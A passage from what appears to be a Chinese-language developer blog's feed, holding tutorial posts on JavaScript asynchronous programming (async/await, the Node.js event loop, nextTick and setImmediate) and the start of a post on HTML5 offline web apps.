class="built_in">console</span>.log(<span class="string">'Generator 函数执行完成'</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>但是co模块要求generator函数内的yiled后只能跟thunk函数或者promise对象。</p><h3 id="终极解决方案：async"><a href="#终极解决方案：async" class="headerlink" title="终极解决方案：async"></a>终极解决方案：async</h3><p>async即异步的意思，现在还是处于草案当中，之前本来说好的 将纳入到es2016中，但是最终还是没有出现，估计是在es2017中(明年)才会纳入规范，但是它是如此美妙，加上有babel等的转换，我们可以直接用起来。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> readFile = <span class="function"><span class="keyword">function</span> (<span class="params">fileName</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="function"><span class="keyword">function</span> (<span class="params">resolve, reject</span>)</span>&#123;</span><br><span class="line">    fs.readFile(fileName, <span class="function"><span class="keyword">function</span>(<span class="params">error, data</span>)</span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (error) <span class="keyword">return</span> reject(error);</span><br><span class="line">      resolve(data);</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">testAsync</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">let</span> data1 = <span class="keyword">await</span> readFile(<span class="string">'./file1.txt'</span>);</span><br><span class="line"><span class="built_in">console</span>.log(data1);</span><br><span class="line"><span class="keyword">let</span> data2 = <span class="keyword">await</span> readFile(<span class="string">'./file2.txt'</span>);</span><br><span class="line"><span class="keyword">return</span> data2;</span><br><span class="line">&#125;</span><br><span class="line">testAsync().then(<span class="function"><span class="params">data2</span>=&gt;</span><span class="built_in">console</span>.log(data2));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'外部hello'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">外部hello</span></span><br><span class="line"><span class="comment">第一个文件</span></span><br><span class="line"><span class="comment">第二个文件</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>await后可跟promise对象和简单的数据，如果不是promise对象，虽然await会在这里异步的调用，但是语句相当于是同步执行了，和generator一样，内部是从上到下依次执行的，只是async自己包装了自动执行器，当我们需要多个异步任务同时执行，以提高效率时，可以将多个promise跟在await后面：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> <span class="built_in">Promise</span>.all([getFoo(), getBar()]);</span><br></pre></td></tr></table></figure></p><p>可见await的方案更加语义化，流程清晰，简介。</p><h3 id="流程控制库"><a href="#流程控制库" class="headerlink" title="流程控制库"></a>流程控制库</h3><p>在async方案出现之前，还有许多的用于流程控制的库</p><ol><li>尾触发如connect中间件</li><li>async模块</li><li>Step库</li><li>wind库</li><li>Q模块</li><li>其他</li></ol><p>由于篇幅限制这里就不详解了，有兴趣可以查阅相关资料。</p><p><strong>文章只是总结一些异步编程的方案，以及它们的关系，并没有非常详细的介绍。</strong></p><p>引用朴灵前辈在《深入浅出NodeJS》异步编程的一句话：</p><p><strong>这个世界以异步运行的本质是不会因为大家线性思维的惯性而改变的。就像日出月落不会因为你的心情而改变其自有的运行轨迹</strong></p><p>异步是如此的美妙，异步编程却给我们一种复杂的感觉，但是困难总是有解决办法的，从最简单的回调函数，到终极解决方案async/await，正是我们不断地探寻更加优雅的解决方案的成果。</p><p><strong>tomorrow will be better</strong></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;我们碰到的最简单的异步解决方案便是回调函数了，回调函数用起来比较简单，但是经常会遇到诸如下面实例的情况：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;jq先后执行的动画&lt;/strong&gt;&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$(&lt;span class=&quot;string&quot;&gt;&#39;#div1&#39;&lt;/span&gt;).animate(&amp;#123;&lt;span class=&quot;attr&quot;&gt;width&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;300&quot;&lt;/span&gt;&amp;#125;,&lt;span class=&quot;number&quot;&gt;3000&lt;/span&gt;,&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	$(&lt;span class=&quot;string&quot;&gt;&#39;#div2&#39;&lt;/span&gt;).animate(&amp;#123;&lt;span class=&quot;attr&quot;&gt;top&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;200px&quot;&lt;/span&gt;&amp;#125;,&lt;span class=&quot;number&quot;&gt;2000&lt;/span&gt;,&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		$(&lt;span class=&quot;string&quot;&gt;&#39;#div3&#39;&lt;/span&gt;).animate(&amp;#123;&lt;span class=&quot;attr&quot;&gt;left&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;100px&quot;&lt;/span&gt;&amp;#125;,&lt;span class=&quot;number&quot;&gt;2000&lt;/span&gt;,&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			$(&lt;span class=&quot;string&quot;&gt;&#39;#div4&#39;&lt;/span&gt;).animate...&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;服务端渲染&lt;/strong&gt;&lt;br&gt;&lt;figure class=&quot;highlight js&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;fs.readFile(template_path,&lt;span class=&quot;string&quot;&gt;&#39;utf-8&#39;&lt;/span&gt;,&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;err,template&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	db.query(sql,&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;err,data&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		l10n.get(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;err,resources&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;			render(template,data,resources);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;		&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;	&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;可见，当有多个异步调用来共同完成一个任务时，会出现函数嵌套过深的情况，使得程序难以阅读和管理。再一点就是，回调函数的写法并不适合我们线性的思维方式，我们需要用同步的写法来完成异步调用。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;文章目录&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;回调函数&lt;/li&gt;
&lt;li&gt;事件相关（事件监听，事件订阅/发布模式)&lt;/li&gt;
&lt;li&gt;Promise&lt;/li&gt;
&lt;li&gt;协程(generator)控制流程，包括generator与thunk函数，generator与promise&lt;/li&gt;
&lt;li&gt;终极解决方案:async&lt;/li&gt;
&lt;li&gt;流程控制库&lt;/li&gt;
&lt;/ol&gt;
    
    </summary>
    
      <category term="JavaScript" scheme="http://luoxia.me/code/categories/JavaScript/"/>
    
    
      <category term="异步编程" scheme="http://luoxia.me/code/tags/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>异步的实现原理</title>
    <link href="http://luoxia.me/code/2016/08/16/%E5%BC%82%E6%AD%A5%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86/"/>
    <id>http://luoxia.me/code/2016/08/16/异步的实现原理/</id>
    <published>2016-08-16T09:59:47.000Z</published>
    <updated>2017-11-16T13:10:06.491Z</updated>
    
    <content type="html"><![CDATA[<p>js作为一门单线程语言，同一时间内只能执行一段代码，所以异步编程对于js来说是非常重要的。然而对于许多习惯同步编程思维的程序员来说，异步的编程方式难免有些不适应，要更加清楚地理解异步编程，还得谈到其内部的实现原理。</p><p>有些人可能会问到，既然js是单线程的，那它为何能够实现一边儿去执行一些耗时操作（比如文件，网络访问等），一边儿又毫无阻碍的去执行其他代码呢？咋一看，确实有点像多线程的感觉，我们所说的单线程是js自身是单线程的，但在执行异步I/O操作时，底层调用的还是多线程。</p><p><strong>关键词</strong></p><ol><li>异步与同步</li><li>阻塞/非阻塞IO与异步IO</li><li>事件驱动（事件循环，请求对象，执行回调)</li><li>基于事件驱动的非I/O异步API<a id="more"></a></li></ol><h3 id="异步与同步的对比："><a href="#异步与同步的对比：" class="headerlink" title="异步与同步的对比："></a>异步与同步的对比：</h3><p>以文件读取操作为例：</p><p><strong>同步操作</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> data1 = fs.readFileSync(<span class="string">'./file1.txt'</span>,<span class="string">'utf-8'</span>);</span><br><span class="line"><span class="keyword">let</span> data2 = fs.readFileSync(<span class="string">'./file2.txt'</span>,<span class="string">'utf-8'</span>);</span><br><span class="line">process(data1); <span class="comment">//处理data</span></span><br><span class="line">process(data2);</span><br><span class="line">...<span class="comment">//其他任务</span></span><br></pre></td></tr></table></figure></p><p>获取data1,data2都是同步执行，这样就有个问题，后面的任务都被阻塞了，如果有大量的这样代码，程序将会卡死</p><p><strong>异步操作</strong><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"></span><br><span class="line">fs.readFile(<span class="string">'./file1.txt'</span>,<span class="string">'utf-8'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line">process(data);</span><br><span class="line">&#125;);</span><br><span class="line">fs.readFile(<span class="string">'./file2.txt'</span>,<span class="string">'utf-8'</span>.function(err,data)&#123;</span><br><span class="line">process(data);</span><br><span class="line">&#125;);</span><br><span class="line">...<span class="comment">//其他任务</span></span><br></pre></td></tr></table></figure></p><p>上例代码中的文件读取操作异步执行，这样操作的总时间将变为两个操作中最大时间，而且读取过程不会阻塞后续任务。</p><p>对于前端工程师来说，异步编程再普通不过了，有许多场景都是异步操作：</p><ol><li>定时器 setTimeout和setInternal</li><li>事件监听，如click,mouseover等事件</li><li>ajax</li></ol><p>它们的异步实现原理都是事件驱动，而对于非I/O操作，它们和I/O操作的内部原理也有一些差别。容我慢慢道来。</p><h3 id="非阻塞I-O和异步的关系"><a href="#非阻塞I-O和异步的关系" class="headerlink" title="非阻塞I/O和异步的关系"></a>非阻塞I/O和异步的关系</h3><p>两者看似相同，其实是两回事，知乎上关于这个问题的解答：<br><a href="http://www.zhihu.com/question/19732473" target="_blank" rel="noopener">http://www.zhihu.com/question/19732473</a></p><p>阻塞与非阻塞描述的应用层在等待系统内核操作时的状态，阻塞I/O指应用程序在请求数据过程中处于挂起状态，等待完整数据返回，而非阻塞I/O不会立即完整数据，但是会立即返回，在等待完整数据的过程中，可以做其他事情。</p><p>非阻塞I/O的实现方式主要是轮询技术，轮询技术主要有read,select,poll,epoll方式</p><ol><li>read方式是原始的不断调用获取数据操作来检测I/O状态</li><li>select方式通过遍历问卷描述符的事件状态来判断</li><li>poll方式采用链表的方式避免select最大同时检查1024文件描述符的限制</li><li>epoll,等待I/O事件，如果没有，则会处于休眠状态</li></ol><p>根据上述可见，非阻塞的I/O并不等于就是异步的了，因为在等待过程当中，CPU要么用来查询文件描述符状态，要么用来等待I/O事件，实际上还是同步执行，而我们需要的是如文章开头异步地读取文件例子，执行异步方法，内核非阻塞调用立即返回，继续执行其他任务，执行回调。对于单线程的这种实现比较少。</p><p>可见非阻塞并不等同于异步。那要怎样来实现异步呢？</p><h4 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h4><p>在多线程的情况下，我们可以将I/O操作另起线程，这个线程可以阻塞的方式读取数据，也可以非阻塞的读取数据，最终将数据返回给程序的主线程。这就是线程池</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/chi.png" alt="线程池"><br>NodeJS在windows平台和*nix平台实现线程池的方式不同，windwos下通过IOCP方式，*nix采用自定义线程池，但是node对不同平台进行了抽象，提供了libuv抽象层。</p><h3 id="事件驱动的异步实现方式"><a href="#事件驱动的异步实现方式" class="headerlink" title="事件驱动的异步实现方式"></a>事件驱动的异步实现方式</h3><h4 id="事件循环"><a href="#事件循环" class="headerlink" title="事件循环"></a>事件循环</h4><p>事件循环机制是Node自身的执行模型，浏览器采用了类似的机制来实现异步。</p><p>事件循环机制中的每一次循环为Tick,首先程序创建主循环，然后每次Tick就会判断是否有事件等待处理，如果有，就取出事件及其回调函数，并执行回调函数。</p><p>这里的事件由哪些产生方式呢？比如有文件读取，ajax,某个dom元素被点击等都会产生事件。</p><h4 id="观察者"><a href="#观察者" class="headerlink" title="观察者"></a>观察者</h4><p>程序的某些操作会不断产生事件，而事件循环过程中需要用于判断是否有事件需要处理的观察者，比如有文件I/O观察者，网络I/O观察者等，对于非I/O操作，对于setTime和setInterval有定时器观察者，process.nextTick()有idle观察者，setImmediate有check观察者等等。</p><p>一个观察者里可能有多个事件，这些事件以队列的方式存在于观察者中，然后每次tick向观察者们循环需要处理的事件</p><h4 id="请求对象"><a href="#请求对象" class="headerlink" title="请求对象"></a>请求对象</h4><p>程序发起异步调用时，会生成请求对象，并设置参数和回调函数，对于文件读取API来说：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">let</span> data = fs.readFile(path,<span class="string">'utf-8'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">err,data</span>)</span>&#123;</span><br><span class="line">.../</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>发起异步的readFile，调用node核心模块fs,fs调用C++內建模块，內建模块通过libuv抽象层根据不同操作系统调用底层的方法，在调用这个底层方法时，就会封装请求对象，请求对象封装了当初调用readFile时的参数，包括回调函数。</p><p>请求对象封装完毕，通过调用(windows下)<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">QueueUserWorkItem()</span><br></pre></td></tr></table></figure></p><p>方法将请求对象推入线程池（上文中的线程池示例），当线程池有空闲线程时，执行任务。<br>这样I/O操作交给了I/O线程，可以阻塞调用也可以非阻塞调用，js后续的任务就可以继续执行了。</p><h4 id="执行回调"><a href="#执行回调" class="headerlink" title="执行回调"></a>执行回调</h4><p>当I/O操作完成时，会通知IOCP(windows的线程池实现)当前操作完成，通过PostQueuedCompletionStatus()提交状态将该线程归还，而每次Tick中,事件观察者都会调用GetQueuedCompletionStatus()方法检测是否有执行完成的请求。</p><p>当有执行完的操作时，观察者会将它们加入到自己的队列，形成事件队列。</p><p>然后就回到了上文的事件循环，每次tick询问观察者有无事件待处理，有了上面的讲述，整个关系就打通了。</p><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/process.png" alt="process"></p><p>这就是文章开头所说的为什么js是单线程但能够实现一边异步执行耗时操作，一边执行其他操作的原因，虽然Js是单线程的，但是平台自身是多线程的，通过线程池，I/O线程阻塞或非阻塞调用都不会对Js后续代码有影响。</p><h3 id="基于事件驱动的非I-O异步API"><a href="#基于事件驱动的非I-O异步API" class="headerlink" title="基于事件驱动的非I/O异步API"></a>基于事件驱动的非I/O异步API</h3><h4 id="定时器"><a href="#定时器" class="headerlink" title="定时器"></a>定时器</h4><p>在《JavaScript高级程序设计》高级函数那一章讲的高级定时器部分对setTimeout和setInterval的执行机制进行了阐述。</p><p>文中讲述的是，定时器指定的时间并不是定时器代码会在指定时间后执行，而是在指定时间后将代码加入到执行队列当中，当有js的线程空余时，再执行队列当中的代码。</p><p>而就事件驱动的原理来讲，定时器的内部机制是：</p><p>类似于异步I/O，但是不需要线程池，调用setTimout和setInterval都会创建定时器，而这些定时器会被插入到定时器观察者的红黑树中，每次tick,定时器观察者会迭代变量这些定时器，检测它们是否超过设定时间，一旦超过时间，就生成一个事件，这个事件和前面讲述的由异步I/O等操作产生的事件类似，都是在队列当中存在，每次tick只是执行一个事件，这就是为什么定时器的代码往往执行得比指定时间晚的缘故了。</p><h4 id="process-nextTick"><a href="#process-nextTick" class="headerlink" title="process.nextTick()"></a>process.nextTick()</h4><p>该方法立即执行一个异步任务，但是它并不会有诸如红黑树的东西，不用去迭代判断事件的产生，而只是简单的将回调函数放入回调函数执行队列当中</p><h4 id="setImmediate"><a href="#setImmediate" class="headerlink" title="setImmediate()"></a>setImmediate()</h4><p>和process.nextTick()类似，但是process.nextTick()会将回调函数保存在数组当中，每轮循环会将这项数组都执行，而setImmediate则是存于链表中，一次只执行一次。另外process.nextTick的观察者是idle观察者，setImmediate属于check观察者，idle观察者先于I/O观察者，I/O观察者先于check观察者。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">process.nextTick(<span class="function"><span class="params">()</span>=&gt;</span><span class="built_in">console</span>.log(<span class="string">'nextTick1执行'</span>));</span><br><span class="line">process.nextTick(<span class="function"><span class="params">()</span>=&gt;</span><span class="built_in">console</span>.log(<span class="string">'nextTick2执行'</span>));</span><br><span class="line">setImmediate(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'setImmediate1执行'</span>);</span><br><span class="line">process.nextTick(<span class="function"><span class="params">()</span>=&gt;</span><span class="built_in">console</span>.log(<span class="string">'插入nextTick'</span>);</span><br><span class="line">&#125;</span><br><span class="line">setImmediate(<span class="function"><span class="params">()</span>=&gt;</span><span class="built_in">console</span>.log(<span class="string">'setImmediate2执行'</span>));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'同步console'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">同步console</span></span><br><span class="line"><span class="comment">nextTick1执行</span></span><br><span class="line"><span class="comment">nextTick2执行</span></span><br><span class="line"><span class="comment">setImmediate1执行</span></span><br><span class="line"><span class="comment">插入nextTick</span></span><br><span class="line"><span class="comment">setImmediate2执行</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>感谢朴灵前辈关于nodeJS的书籍《深入浅出nodeJS》，受益匪浅。</p><p>大致了解了异步的实现原理，接下来一篇文章将会总结一下异步编程解决方案。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;js作为一门单线程语言，同一时间内只能执行一段代码，所以异步编程对于js来说是非常重要的。然而对于许多习惯同步编程思维的程序员来说，异步的编程方式难免有些不适应，要更加清楚地理解异步编程，还得谈到其内部的实现原理。&lt;/p&gt;
&lt;p&gt;有些人可能会问到，既然js是单线程的，那它为何能够实现一边儿去执行一些耗时操作（比如文件，网络访问等），一边儿又毫无阻碍的去执行其他代码呢？咋一看，确实有点像多线程的感觉，我们所说的单线程是js自身是单线程的，但在执行异步I/O操作时，底层调用的还是多线程。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;关键词&lt;/strong&gt;&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;异步与同步&lt;/li&gt;
&lt;li&gt;阻塞/非阻塞IO与异步IO&lt;/li&gt;
&lt;li&gt;事件驱动（事件循环，请求对象，执行回调)&lt;/li&gt;
&lt;li&gt;基于事件驱动的非I/O异步API
    
    </summary>
    
      <category term="JavaScript" scheme="http://luoxia.me/code/categories/JavaScript/"/>
    
    
      <category term="异步编程" scheme="http://luoxia.me/code/tags/%E5%BC%82%E6%AD%A5%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>离线应用开发基础</title>
    <link href="http://luoxia.me/code/2016/08/10/%E7%A6%BB%E7%BA%BF%E5%BA%94%E7%94%A8%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/"/>
    <id>http://luoxia.me/code/2016/08/10/离线应用开发基础/</id>
    <published>2016-08-10T13:05:17.000Z</published>
    <updated>2017-11-16T13:10:06.492Z</updated>
    
    <content type="html"><![CDATA[<h5 id="所谓离线web应用就是设备在断网的情况下能够正常运行的应用，这也是html5规范的一个重点。要开发一款离线的web应用，需要哪些条件和步骤呢？"><a href="#所谓离线web应用就是设备在断网的情况下能够正常运行的应用，这也是html5规范的一个重点。要开发一款离线的web应用，需要哪些条件和步骤呢？" class="headerlink" title="所谓离线web应用就是设备在断网的情况下能够正常运行的应用，这也是html5规范的一个重点。要开发一款离线的web应用，需要哪些条件和步骤呢？"></a>所谓离线web应用就是设备在断网的情况下能够正常运行的应用，这也是html5规范的一个重点。要开发一款离线的web应用，需要哪些条件和步骤呢？</h5><ol><li>离线检测，可以检测设备是否联网来采取不同的策略</li><li>需要提供本地缓存相关API,让用户联网时对一些必要资源进行本地缓存，如图片，css样式等文件</li><li>需要提供本地数据储存API，来储存一些必要用户数据</li></ol><h5 id="HTML5提供了强大的API来支持这些要求："><a href="#HTML5提供了强大的API来支持这些要求：" class="headerlink" title="HTML5提供了强大的API来支持这些要求："></a>HTML5提供了强大的API来支持这些要求：</h5><ol><li>navigator对象的onLine属性判断联网状态，并提供online,offline事件用于检测状态改变</li><li>提供本地缓存（application cache)机制缓存必要数据</li><li>提供WebStorage储存简单的key/value数据，提供本地数据库（包括SQLLite和IndexdDB，前者为SQL数据库，后者为NoSQL型数据库)</li></ol><a id="more"></a><h3 id="联网状态检测"><a href="#联网状态检测" class="headerlink" title="联网状态检测"></a>联网状态检测</h3><p><strong>navigator.online属性</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(navigator.online)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'客户端联网'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'断线'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>online和offline事件</strong></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'online'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">alert(<span class="string">'offLine to onLine'</span>);</span><br><span class="line">&#125;,<span class="literal">false</span>);</span><br><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">'offline'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">alert(<span class="string">'onLine to offLine'</span>);</span><br><span class="line">&#125;,flse);</span><br></pre></td></tr></table></figure><h3 id="本地应用缓存"><a href="#本地应用缓存" class="headerlink" title="本地应用缓存"></a>本地应用缓存</h3><h4 id="本地缓存和网页缓存区别："><a href="#本地缓存和网页缓存区别：" class="headerlink" title="本地缓存和网页缓存区别："></a>本地缓存和网页缓存区别：</h4><ol><li>本地缓存为整个web应用服务，网页缓存服务员单个网页</li><li>本地缓存更安全可靠可控，可指定缓存特定文件，并可以通过编程手段对缓存进行更新等。</li></ol><h4 id="manifest文件"><a href="#manifest文件" class="headerlink" title="manifest文件"></a>manifest文件</h4><p>应用的本地缓存通过页面的manifest文件进行管理，可以为每个页面指定特定的manifest,也可以指定全局的manifest:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">manifest</span>=<span class="string">'myCache.manifest'</span> <span class="attr">lang</span>=<span class="string">'en'</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>manifest文件示例</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CACHE MANIFEST</span><br><span class="line">#必须以上述行开头</span><br><span class="line">#version 1.02</span><br><span class="line">CACHE:</span><br><span class="line">js/script.js</span><br><span class="line">style/main.css</span><br><span class="line">NETWORK</span><br><span class="line">*</span><br><span class="line">#NETWORK指定只有在联网状态时才能访问的资源,*表示出了CACHE指定资源</span><br><span class="line">FALLBACK</span><br><span class="line">newIndex1.html</span><br><span class="line">newInde2.html</span><br><span class="line">#FALLBACK两行分别指定联网和断线状态下访问的资源</span><br></pre></td></tr></table></figure><h4 id="简述浏览器请求数据过程："><a href="#简述浏览器请求数据过程：" class="headerlink" 